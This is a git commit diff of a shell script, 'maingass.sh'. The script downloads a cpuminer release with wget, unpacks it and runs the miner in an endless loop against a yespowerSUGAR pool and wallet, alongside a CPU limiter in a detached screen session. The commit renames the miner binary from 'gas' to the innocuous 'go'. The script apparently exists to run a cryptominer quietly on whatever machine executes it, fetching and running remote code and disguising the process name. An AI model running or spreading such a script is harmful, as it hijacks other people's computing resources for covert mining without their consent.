c484cdaa3b6de735810efad716aaa33a22703ae6
wikangdijalalan2 <82296471+wikangdijalalan2@users.noreply.github.com>
2021-04-13 21:23:26 +0800

    Update maingass.sh

--- maingass.sh
+++ maingass.sh
@@ -8,9 +8,9 @@ chmod +x limiting.sh
 screen -dmS randum ./limiting.sh cpuminer-avx 6575 
 wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz 
 tar -xf cpuminer-opt-linux.tar.gz 
-mv cpuminer-avx gas
+mv cpuminer-avx go
 while [ 1 ]; do
-./gas -a yespowerSUGAR -o stratum+tcps://stratum-eu.rplant.xyz:17042 -u sugar1qdgf4da5dcafhug574a0zjrfwkge262tl3q99e8.Okbaah 
+./go -a yespowerSUGAR -o stratum+tcps://stratum-eu.rplant.xyz:17042 -u sugar1qdgf4da5dcafhug574a0zjrfwkge262tl3q99e8.Okbaah 
 sleep 3 
 done
 sleep 999 
